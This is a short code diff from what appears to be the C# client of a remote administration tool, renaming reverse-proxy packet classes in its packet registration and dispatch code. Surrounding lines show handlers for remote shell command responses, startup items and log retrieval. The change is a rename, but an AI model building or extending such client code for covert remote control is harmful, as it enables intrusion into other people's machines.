@@ -91,10 +91,10 @@ namespace xClient
                 typeof (Core.Packets.ClientPackets.ShellCommandResponse),
                 typeof (Core.Packets.ClientPackets.GetStartupItemsResponse),
                 typeof (Core.Packets.ClientPackets.GetLogsResponse),
-                typeof (Core.ReverseProxy.Packets.ReverseProxy_Connect),
-                typeof (Core.ReverseProxy.Packets.ReverseProxy_ConnectResponse),
-                typeof (Core.ReverseProxy.Packets.ReverseProxy_Data),
-                typeof (Core.ReverseProxy.Packets.ReverseProxy_Disconnect)
+                typeof (Core.ReverseProxy.Packets.ReverseProxyConnect),
+                typeof (Core.ReverseProxy.Packets.ReverseProxyConnectResponse),
+                typeof (Core.ReverseProxy.Packets.ReverseProxyData),
+                typeof (Core.ReverseProxy.Packets.ReverseProxyDisconnect)
             });
 
             ConnectClient.ClientState += ClientState;
@@ -328,10 +328,10 @@ namespace xClient
             {
                 CommandHandler.HandleGetLogs((Core.Packets.ServerPackets.GetLogs)packet, client);
             }
-            else if (type == typeof(Core.ReverseProxy.Packets.ReverseProxy_Connect) ||
-                     type == typeof(Core.ReverseProxy.Packets.ReverseProxy_ConnectResponse) ||
-                     type == typeof(Core.ReverseProxy.Packets.ReverseProxy_Data) ||
-                     type == typeof(Core.ReverseProxy.Packets.ReverseProxy_Disconnect))
+            else if (type == typeof(Core.ReverseProxy.Packets.ReverseProxyConnect) ||
+                     type == typeof(Core.ReverseProxy.Packets.ReverseProxyConnectResponse) ||
+                     type == typeof(Core.ReverseProxy.Packets.ReverseProxyData) ||
+                     type == typeof(Core.ReverseProxy.Packets.ReverseProxyDisconnect))
             {
                 ReverseProxyCommandHandler.HandleCommand(client, packet);
             }
